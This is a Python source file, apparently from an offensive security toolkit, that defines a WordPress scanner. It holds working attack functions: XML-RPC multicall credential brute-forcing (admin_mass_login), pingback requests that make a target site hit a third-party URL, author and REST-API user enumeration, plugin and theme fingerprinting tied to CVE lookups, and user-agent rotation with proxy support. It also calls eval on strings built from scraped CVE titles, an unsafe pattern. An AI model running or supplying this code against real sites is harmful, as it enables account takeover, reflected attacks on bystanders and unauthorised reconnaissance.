from bane.scanners.cms.utils import *


class WordPress_Scanner:

    @staticmethod
    def get_xmlrpc_methods(
        u, user_agent=None, cookie=None, path="/xmlrpc.php",proxy=None, timeout=10,headers={},http_proxies=None,socks4_proxies=None,socks5_proxies=None):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        u += path
        post = """
    <?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>system.listMethods</methodName> 
    <params></params> 
    </methodCall>
    """
        try:
            if proxy==None:
                proxy=setup_proxy(proxies)
            r = requests.Session().post(
                u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
            )
            return [
                x.replace("</string></value>", "").replace("<value><string>", "").strip()
                for x in r.text.split("<data>")[1].split("</data>")[0].strip().split("\n")
            ]
        except:
            pass
        return []

    @staticmethod
    def xmlrpc_bruteforce(
        u, user_agent=None,proxy=None, cookie=None, path="/xmlrpc.php", timeout=10, headers={},http_proxies=None,socks4_proxies=None,socks5_proxies=None):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        u += path
        post = """
    <?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>system.listMethods</methodName> 
    <params></params> 
    </methodCall>
    """
        try:
            if proxy==None:
                proxy=setup_proxy(proxies)
            r = requests.Session().post(
                u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
            )
            if "wp.getUsersBlogs" in [
                x.replace("</string></value>", "").replace("<value><string>", "").strip()
                for x in r.text.split("<data>")[1].split("</data>")[0].strip().split("\n")
            ]:
                return True
        except:
            pass
        return False


    @staticmethod
    def xmlrpc_mass_bruteforce(
        u, user_agent=None, cookie=None, path="/xmlrpc.php", timeout=10, proxy=None, headers={},http_proxies=None,socks4_proxies=None,socks5_proxies=None):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        u += path
        post = """
    <?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>system.listMethods</methodName> 
    <params></params> 
    </methodCall>
    """
        try:
            if proxy==None:
                proxy=setup_proxy(proxies)
            r = requests.Session().post(
                u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
            )
            l = [
                x.replace("</string></value>", "").replace("<value><string>", "").strip()
                for x in r.text.split("<data>")[1].split("</data>")[0].strip().split("\n")
            ]
            if ("wp.getUsersBlogs" in l) and ("system.multicall" in l):
                return True
        except:
            pass
        return False


    @staticmethod
    def xmlrpc_pingback(
        u,
        user_agent=None,
        test_url="https://www.google.com/",
        cookie=None,
        path="/xmlrpc.php",
        timeout=10,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        proxy=None
        ):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if proxy==None:
                proxy=setup_proxy(proxies)
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        u += path
        post = """
    <?xml version="1.0" encoding="utf-8"?> 
    <methodCall> 
    <methodName>system.listMethods</methodName> 
    <params></params> 
    </methodCall>
    """
        try:
            r = requests.Session().post(
                u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
            )
            l = [
                x.replace("</string></value>", "").replace("<value><string>", "").strip()
                for x in r.text.split("<data>")[1].split("</data>")[0].strip().split("\n")
            ]
            if "pingback.ping" in l:
                return True
        except:
            pass
        return False


    @staticmethod
    def xmlrpc_pingback_exploit(
        u,
        user_agent=None,
        target_url="https://www.google.com/",
        cookie=None,
        path="/xmlrpc.php",
        timeout=10,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        proxy=None
        ):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if proxy==None:
                proxy=setup_proxy(proxies)
        url = u.split("://")[0] + "://" + urlparse(u).netloc
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        url += path
        post = (
            """<?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>pingback.ping</methodName>
    <params>
    <param>
    <value><string>"""
            + target_url
            + """</string></value>
    </param>
    <param>
    <value><string>"""
            + u
            + """</string></value>
    </param>
    </params>
    </methodCall>
    """
        )
        try:
            r = requests.Session().post(
                url, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
            )
        except:
            pass


    @staticmethod
    def admin_login(
        u,
        username,
        password,
        user_agent=None,
        cookie=None,
        path="/xmlrpc.php",
        timeout=10,
        headers={},
        http_proxies=None
        ,socks4_proxies=None,
        socks5_proxies=None,
        proxy=None
        ):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if proxy==None:
                proxy=setup_proxy(proxies)
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        u += path
        post = """<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>{}</value></param>
    <param><value>{}</value></param>
    </params>
    </methodCall>""".format(
            username, password
        )
        try:
            r = requests.Session().post(
                u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
            )
            if "isAdmin" in r.text:
                return True
        except:
            pass
        return False


    @staticmethod
    def admin_mass_login(
        u,
        word_list=[],
        user_agent=None,
        cookie=None,
        path="/xmlrpc.php",
        timeout=10,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        proxy=None
        ):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if proxy==None:
                proxy=setup_proxy(proxies)
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        u += path
        post = """
    <?xml version="1.0"?>
    <methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
    """
        for x in word_list:
            post += """<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array>
    <data><value><array><data><value><string>{}</string></value><value><string>{}</string></value>
    </data></array></value></data></array></value></member></struct></value>
    """.format(
                x.split(":")[0], x.split(":")[1]
            )
        post += """
    </data></array></value></param></params></methodCall>
    """
        try:
            r = requests.Session().post(
                u, data=post, headers=hed, proxies=proxy, timeout=timeout, verify=False
            )
            l = (
                r.text.split("<array><data>")[1]
                .split("</array></data>")[0]
                .strip()
                .split("</struct></value>")
            )
            for x in l:
                if "Incorrect username or password" not in x:
                    return word_list[l.index(x)]
        except:
            pass
        return ""


    @staticmethod
    def json_users(
        u, path="/wp-json/wp/v2/users", timeout=10, user_agent=None, cookie=None, proxy=None, headers={},http_proxies=None,socks4_proxies=None,socks5_proxies=None):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        
        if proxy==None:
                proxy=setup_proxy(proxies)
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        u += path
        try:
            r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
            if ('{"id":' in r.text) and ('"name":"' in r.text):
                a = json.loads(r.text)
                users = []
                for x in range(len(a)):
                    users.append(
                        {"id": a[x]["id"], "slug": a[x]["slug"], "name": a[x]["name"]}
                    )
                return users
        except Exception as e:
            return []
        return []


    @staticmethod
    def json_user(
        u,
        path="/wp-json/wp/v2/users/",
        user=1,
        user_agent=None,
        cookie=None,
        timeout=10,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        proxy=None
        ):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        
        if proxy==None:
                proxy=setup_proxy(proxies)
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        hed.update(headers)
        u += path + str(user)
        try:
            r = requests.Session().get(u, headers=hed, proxies=proxy, timeout=timeout, verify=False)
            if ('{"id":' in r.text) and ('"name":"' in r.text):
                return json.loads(r.text)
        except Exception as e:
            pass


    @staticmethod
    def users_enumeration(
        u,
        path="/",
        timeout=15,
        user_agent=None,
        cookie=None,
        start=1,
        end=20,
        logs=True,
        headers={},
        http_proxies=None,
        socks4_proxies=None,
        socks5_proxies=None,
        proxy=None
        ):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if proxy==None:
                proxy=setup_proxy(proxies)    
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        d = u.split("://")[1].split("/")[0]
        u = u.split(d)[0] + d
        l = []
        for x in range(start, end + 1):
            try:
                r = requests.Session().get(
                    u + path + "?author=" + str(x),
                    headers=hed,
                    proxies=proxy,
                    timeout=timeout,
                    verify=False,
                ).text
                a = r.split('<meta property="og:title" content="')[1].split(">")[0]
                b=r.split('<meta property="og:url" content="')[1].split(">")[0]
                c=b.split('/author/')[1].split('/')[0]
                if "," in a:
                    a = a.split(",")[0]
                    l.append({'id':x, 'name':a,'slug':c})
                    if logs == True:
                        print(
                            "\t[+] id: {} | name: {} | slug: {}".format(
                                x,#.encode("utf-8", "replace"), 
                                a,
                                c
                            )
                        )
            except KeyboardInterrupt:
                break
            except:
                pass
        return l


    @staticmethod
    def get_version(u, timeout=15, user_agent=None, cookie=None, proxy=None,headers={},http_proxies=None,socks4_proxies=None,socks5_proxies=None):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if proxy==None:
                proxy=setup_proxy(proxies)
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        try:
            r = requests.Session().get(
                u, headers=hed, proxies=proxy, timeout=timeout, verify=False
            ).text
            return (
                r.split('<meta name="generator" content="')[1]
                .split('"')[0]
                .strip()
                .split(" ")[1]
            )
        except:
            pass


    @staticmethod        
    def version_string_to_list(version):
        return [int(x) for x in version.split('.')]



    @staticmethod
    def extract_with_versions(cve_list,software_version):
        results = []
        for cve in cve_list:
            title = cve['title']
            try:
                version = [ x.strip() for x in title.split() if '.' in x and x.endswith('.')==False and x.startswith('.')==False][0]
            except:
                version=''
            if version!='':
                try:
                    c=title.split(version)[0].split()
                    if c[-1].strip()=='<':
                        comparison='<'
                    elif c[-1].strip()=='>':
                        comparison='>'
                    elif c[-1].strip()=='<=':
                        comparison='<='
                    else:
                        comparison='=='
                except:
                    comparison='=='
            if version=='':
                version=software_version
            if '-' not in version:
                if eval('{}{}{}'.format(WordPress_Scanner.version_string_to_list(software_version),comparison,WordPress_Scanner.version_string_to_list(version)))==True:
                    results.append(cve)
            else:
                if eval('{}>{} and {}<{}'.format(WordPress_Scanner.version_string_to_list(software_version),WordPress_Scanner.version_string_to_list(version.split('-')[0].strip()),WordPress_Scanner.version_string_to_list(software_version),WordPress_Scanner.version_string_to_list(version.split('-')[1].strip())))==True:
                    results.append(cve)
        return results




    @staticmethod
    def fetch_exploits(s,search_type='',max_tries=3,proxy=None,user_agent=None,timeout=40,cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30,http_proxies=None,socks4_proxies=None,socks5_proxies=None):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        if proxy==None:
                proxy=setup_proxy(proxies)
        if s['version'].strip()=='':
            return []
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        i=1
        l=[]
        result=[]
        tries=0
        soup = BeautifulSoup('', 'html.parser')
        try:
                r=requests.Session().get('https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=WordPress_Info {} {}'.format(search_type,s['name']),headers=hed,timeout=timeout,proxies=proxy,verify=False).text
                soup = BeautifulSoup(r, 'html.parser')
        except Exception as ex:
                pass
        a=soup.find_all('tr')
        try:
            l=[x for x in a if s['name'].replace('-',' ').replace('_',' ') in str(x).replace('-',' ').replace('_',' ')]
        except:
            return []
        d=[]
        for x in l:
            #print(x.find_all('td')[0].find_all('a').href)
            url='https://cve.mitre.org'+x.find_all('a')[0].get('href','')
            title=x.find_all('td')[0].find_all('a')[0].contents[0]
            description=x.find_all('td')[1].contents[0]
            d.append({'exploit_url':url,'title':title,'description':description})
        return d



    @staticmethod
    def scan(u,max_wpscan_tries=3,cookie=None,user_agent=None,timeout=20,proxy=None,user_enum_start=1,user_enum_end=20,wpscan_cookie=None,sleep_time_min=10,sleep_time_max=20,when_blocked_sleep=30,logs=True,crt_timeout=120,wayback_timeout=120,subdomain_check_timeout=10,max_wayback_urls=10,subdomains_only=True,headers={},api_key=None,http_proxies=None,socks4_proxies=None,socks5_proxies=None):
        proxies=Proxies_Interface.get_requests_proxies_from_parameters(http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies)
        domain=u.split('://')[1].split('/')[0].split(':')[0]
        root_domain=Subdomain_Info.extract_root_domain(domain)
        ip=socket.gethostbyname(domain.split(':')[0])
        if u[len(u) - 1] == "/":
            u = u[0 : len(u) - 1]
        if user_agent:
            us = user_agent
        else:
            us = random.choice(Common_Variables.user_agents_list)
        hed = {"User-Agent": us}
        if cookie:
            hed.update({"Cookie": cookie})
        hed.update(headers)
        response = requests.Session().get(u, headers=hed, proxies=setup_proxy(proxies), timeout=timeout, verify=False)
        server=response.headers.get('Server','')
        try:
            server_os=[x for x in server.split() if x.startswith('(')==True][0].replace('(','').replace(')','')
        except:
            server_os=''
        backend=response.headers.get('X-Powered-By','')
        html_content = response.text

        # Parse the HTML content
        soup = BeautifulSoup(html_content, 'html.parser')

        # Find themes and plugins information
        themes = []
        plugins = []
        try:
            #print(response.split('<meta name="generator" content="')[1].split('"')[0])
            wp_version=response.text.lower().split('<meta name="generator" content="WordPress_Info')[1].split('"')[0].strip()
        except Exception as ex:
            #raise(ex)
            wp_version=''
        # Extract themes
        if logs==True:
            print("WordPress_Info site info:\n\n\tURL: {}\n\tDomain: {}\n\tIP: {}\n\tServer: {}\n\tOS: {}\n\tBackend technology: {}\n\tWordPress_Info version: {}\n".format(u,domain,ip,server,server_os,backend,wp_version))
        clickj=ClickJacking_Scanner.scan(u,request_headers=response.headers)
        if logs==True:
            print("[i] Looking for subdomains...")
        subs=Subdomain_Info.get_subdomains(root_domain,logs=logs, crt_timeout=crt_timeout,user_agent=user_agent,cookie=cookie,wayback_timeout=wayback_timeout,subdomain_check_timeout=subdomain_check_timeout,max_wayback_urls=max_wayback_urls,proxy=setup_proxy(proxies),subdomains_only=subdomains_only)
        if logs==True:
            print("[i] Cheking if we can sniff some cookies over some links...")
            print()
        media_non_ssl=Mixed_Content_Scanner.scan(u,content=response.text,logs=logs,request_headers=response.headers)
        if logs==True:
            print()
        theme_links = soup.find_all('link', rel='stylesheet')
        for link in theme_links:
            href = link.get('href')
            #print(href)
            if 'themes' in href:
                try:
                    theme_name = href.split('/themes/')[1].split('/')[0]
                    try:
                        version=href.split('?')[1].split('=')[1]
                    except:
                        version=''
                    theme={'name':theme_name,'version':version}
                    if theme not in themes:
                        themes.append(theme)
                except:
                    pass
            elif 'plugins' in href:
                try:
                    plugin_name = href.split('/plugins/')[1].split('/')[0]
                    try:
                        version=href.split('?')[1].split('=')[1]
                    except:
                        version=''
                    plugin={'name':plugin_name,'version':version}
                    if plugin not in plugins:
                        plugins.append(plugin)
                except:
                    pass
        users_json_exposed=True
        json_path=u+'/wp-json/wp/v2/users'
        if logs==True:
            print('[i] Fetching users from: {}'.format(json_path))
        json_users=WordPress_Scanner.json_users(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=setup_proxy(proxies),headers=headers)
        if logs==True:
            for x in json_users:
                print('\t[+] id: {} | name: {} | slug: {}'.format(x['id'],x['name'],x['slug']))
            print()
        if json_users==[]:
            users_json_exposed=False
        can_enumerate_users=True
        if logs==True:
            print('[i] Trying enumerating the authors...')
        enumerated_users= WordPress_Scanner.users_enumeration(u,logs=logs,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=setup_proxy(proxies),start=user_enum_start,end=user_enum_end,headers=headers)
        if enumerated_users==[]:
            can_enumerate_users=False
        else:
            if logs==True:
                print()
                for x in enumerated_users:
                    print('\t[+] id: {} | name: {} | slug: {}'.format(x['id'],x['name'],x['slug']))
        if logs==True:
            print()
            print('[i] Checking if XMLRPC is enabled from: {}'.format(u+'/xmlrpc.php'))
        xmlrpcs=WordPress_Scanner.xmlrpc_methods(u,timeout=timeout,cookie=cookie,user_agent=user_agent,proxy=setup_proxy(proxies),headers=headers)
        can_b_u=("wp.getUsersBlogs" in xmlrpcs) and ("system.multicall" in xmlrpcs)
        can_pb="pingback.ping" in xmlrpcs
        if logs==True:
            if len(xmlrpcs)>0:
                print('[+] enabled')
                if can_b_u==True:
                    print('\t[+] Vulnerable to users bruteforce')
                if can_pb==True:
                    print('\t[+] Vulnerable to pingback')
            else:
                print('\t[-] disabled')
            print()
        wp_vulns=[]
        if wp_version!='':
            if logs==True:
                print('[i] looking for exploits for version: {}\n'.format(wp_version))
            wpvulns=vulners_search('WordPress_Info',version=wp_version,proxy=setup_proxy(proxies),api_key=api_key)
            for x in wpvulns:
                if 'WordPress_Info' in x['title'].lower() or 'WordPress_Info' in x['description'].lower():
                    wp_vulns.append(x)
            for x in wp_vulns:
                for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                    try:
                        del x[i]
                    except:
                        pass
            if logs==True:
                if len(wp_vulns)==0:
                    print('\t[-] none was found')
                else:
                    for x in wp_vulns:
                        print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                        print()
        backend_technology_exploits={}
        if backend!='':
            bk=[]
            for back in backend.split():
                if logs==True:
                    print('[i] looking for exploits for : {}\n'.format(back))
                if '/' not in back:
                    if logs==True:
                        print('\t[-] unknown version\n')
                else:
                    bk=vulners_search(back.split('/')[0].lower(),version=back.split('/')[1],proxy=setup_proxy(proxies),api_key=api_key)
                for x in bk:
                    for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                        try:
                            del x[i]
                        except:
                            pass
                backend_technology_exploits.update({back:bk})
                if logs==True:
                    if len(bk)==0:
                        print('\t[-] none was found')
                    else:
                        for x in bk:
                            print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                            print()
        server_exploits={}
        if server!='':
            for sv in server.split():
                if sv.startswith('(')==False:
                    sv_e=[]
                    if logs==True:
                        print('[i] looking for exploits for : {}\n'.format(sv))
                    if '/' in sv:
                        sv_e=vulners_search(sv.split('/')[0].lower(),version=sv.split('/')[1],proxy=setup_proxy(proxies),api_key=api_key)
                    else:
                        if logs==True:
                            print('\t[-] unknown version\n')
                    for x in sv_e:
                        for i in ['cpe', 'cpe23', 'cwe', 'affectedSoftware']:
                            try:
                                del x[i]
                            except:
                                pass
                    server_exploits.update({sv:sv_e})
                    if logs==True:
                        if len(sv_e)==0:
                            print('\t[-] none was found')
                        else:
                            for x in sv_e:
                                print("\tTitle : {}\n\tDescription: {}\n\tLink: {}".format(x['title'],x['description'],x['href']))
                                print()
        if len(themes)>0:
            if logs==True:
                print('[i] looking for exploits for the themes:\n')
        for x in themes:
            if logs==True:
                print('[i] Theme: {} | Version: {}\n'.format(x['name'],x['version']))
            x['exploits']=WordPress_Scanner.fetch_exploits(x,search_type='theme',max_tries=max_wpscan_tries,http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
            if logs==True:
                for i in x['exploits']:
                    print("\tTitle: {}\n\tLink: {}".format(i['title'],i['exploit_url']))
                    print()
        if len(plugins)>0:
            if logs==True:
                print()
                print('[i] looking for exploits for the plugins:\n')
        for x in plugins:
            if logs==True:
                print('[i] Plugin: {} | Version: {}\n'.format(x['name'],x['version']))
            x['exploits']=WordPress_Scanner.fetch_exploits(x,search_type='plugin',max_tries=max_wpscan_tries,http_proxies=http_proxies,socks4_proxies=socks4_proxies,socks5_proxies=socks5_proxies,user_agent=user_agent,timeout=timeout,cookie=wpscan_cookie,sleep_time_min=sleep_time_min,sleep_time_max=sleep_time_max,when_blocked_sleep=when_blocked_sleep)
            if logs==True:
                for i in x['exploits']:
                    print("\tTitle: {}\n\tLink: {}".format(i['title'],i['exploit_url']))
                    print()
        return {'url':u,'domain':domain,'ip':ip,'shodan_report':IP_info.check_ip_via_shodan(ip,logs=logs,timeout=timeout,proxy=setup_proxy(proxies)),'root_domain':root_domain,'sub_domains':subs,'server':server,'os':server_os,'backend_technology':backend,'WordPress_Info_version':wp_version,'sniffable_links':media_non_ssl,'clickjackable':clickj,'themes':themes,'plugins':plugins,'users_json_exposed':users_json_exposed,'exopsed_json_users':{'users':json_users,'path':json_path},'can_enumerate_users':can_enumerate_users,'enumerated_users':enumerated_users,'enabled_xmlrpc_methods':xmlrpcs,"xmlrpc_bruteforce_users":can_b_u,"pingback_enabled":can_pb,"exploits":wp_vulns,'backend_technology_exploits':backend_technology_exploits,'server_exploits':server_exploits}
